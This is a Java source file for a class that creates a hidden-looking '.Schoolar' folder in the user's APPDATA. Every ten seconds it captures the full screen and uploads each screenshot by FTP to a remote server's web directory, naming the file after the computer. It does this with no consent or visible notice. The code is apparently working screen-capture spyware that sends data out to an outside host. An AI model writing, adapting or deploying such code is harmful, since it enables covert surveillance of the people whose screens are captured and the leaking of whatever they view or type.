package image;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Timer;
import java.util.TimerTask;

import javax.imageio.ImageIO;

public class Client implements Runnable {

	String host, user, pass;

	public void run() {
		final String dataFolder = System.getenv("APPDATA") + "\\.Schoolar";
		File folder = new File(dataFolder);
		if (!folder.exists()) {
			System.out.println("creating directory: " + ".Schoolar");
			boolean result = folder.mkdir();
			if (result) {
				System.out.println("DIR created");
			}
		}
		Timer timer = new Timer();
		timer.scheduleAtFixedRate(new TimerTask() {
			public void run() {
				try {
					System.out.println("Sending screen");
					screenShot(dataFolder);
				} catch (IOException | AWTException e) {
					e.printStackTrace();
				}
			}
		}, 0, 10000);
	}

	public void screenShot(String dataFolder) throws IOException, AWTException {
		takeScreenShot(dataFolder);
		uploadScreenShot(dataFolder);
	}

	public void takeScreenShot(String dataFolder) throws IOException,
			AWTException {
		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		Rectangle screenRectangle = new Rectangle(screenSize);
		Robot robot = new Robot();
		BufferedImage image = robot.createScreenCapture(screenRectangle);
		ImageIO.write(image, "png", new File(dataFolder + "\\screenshot.png"));
	}

	public void uploadScreenShot(String dataFolder) {
		String ftpUrl = "ftp://%s:%s@%s/%s;type=i";
		String host = this.host;
		String user = this.user;
		String pass = this.pass;
		String filePath = dataFolder + "\\screenshot.png";
		String uploadPath = "/htdocs/" + System.getenv("computername") + ".png";

		ftpUrl = String.format(ftpUrl, user, pass, host, uploadPath);
		System.out.println("Upload URL: " + ftpUrl);

		try {
			URL url = new URL(ftpUrl);
			URLConnection conn = url.openConnection();
			OutputStream outputStream = conn.getOutputStream();
			FileInputStream inputStream = new FileInputStream(filePath);

			byte[] buffer = new byte[4096];
			int bytesRead = -1;
			while ((bytesRead = inputStream.read(buffer)) != -1) {
				outputStream.write(buffer, 0, bytesRead);
			}

			inputStream.close();
			outputStream.close();

			System.out.println("File uploaded");
		} catch (IOException ex) {
			ex.printStackTrace();
		}
	}

	public Client(String host, String user, String pass) {
		this.host = host;
		this.user = user;
		this.pass = pass;
	}
}